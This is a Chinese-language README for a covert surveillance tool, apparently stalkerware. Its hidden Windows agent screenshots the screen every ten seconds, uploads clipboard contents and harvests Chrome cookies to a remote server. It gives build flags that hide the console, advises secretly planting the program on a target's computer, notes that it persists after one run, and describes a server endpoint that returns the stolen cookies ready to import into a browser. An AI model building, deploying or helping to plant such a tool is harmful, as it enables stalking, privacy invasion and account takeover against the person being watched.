# 我会一直视奸你
> 一直、一直、一直

### demo site：[http://amywxd.site:3090](http://amywxd.site:3090)

## 一款三端的视奸工具
功能是每10s截一张屏幕上传，每2s上传剪贴板内容，每次开机获取Chrome浏览器cookie并上传。

### 被视奸方-agent

- 适用于`Windows`
- 记得修改源码中服务器地址，如果syso文件不可用，请自行 `rsrc -manifest`
- 编译: `go mod tidy`
  - `go build -ldflags="-H=windowsgui"`
  - 命令行参数-H=windowsgui可以隐藏终端       
- 用[你的办法](http://amywxd.site:3090)埋好雷把软件放到ta电脑上
- git编译时务必同时保存`.bat`和`.vbs`以及`cookie_ext.exe`文件，因为go要内嵌
- 放行运行一次`monitor-agent.exe`，即可持久化

### 服务器-server

- 需要CGO_ENABLED，所以不建议交叉编译。
- 在你服务器上：`go mod tidy`
    - `go build -o monitor-server main.go`
- 记得配好端口(默认5656)，然后`nohup ./monitor-server &`就完事了
> 下面这条有点争议，可在源码中修改PASSWORD
- 由于另外获取了cookies，所以可以通过`/api/cookies?pwd=PASSWORD`获取浏览器cookies
  - 且返回方式是以domain分组好的，可直接导入浏览器使用

### 阴暗的保安-SyncViewer

- 需要`wails`环境。
- 适用于`macOS`，`Windows`
- 在`app.go`中修改服务器地址
- `wails build`后再`build/bin`文件夹下就能找到软件了，打开就能美美视奸对面了。